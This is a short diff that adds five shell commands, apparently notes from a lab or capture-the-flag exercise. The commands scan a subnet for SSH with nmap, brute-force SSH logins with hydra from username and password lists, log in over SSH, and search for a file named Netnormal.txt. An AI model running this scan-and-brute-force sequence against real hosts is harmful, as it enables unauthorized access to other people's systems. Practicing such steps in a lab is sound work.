@@ -1,0 +1,5 @@
+nmap -p 22 ip/24
+hydra -L /home/attacker/Desktop/username.txt -P /home/attacker/Desktop/password.txt ip/24
+ssh
+ssh uname@IP
+find / -name Netnormal.txt 2>/dev/null
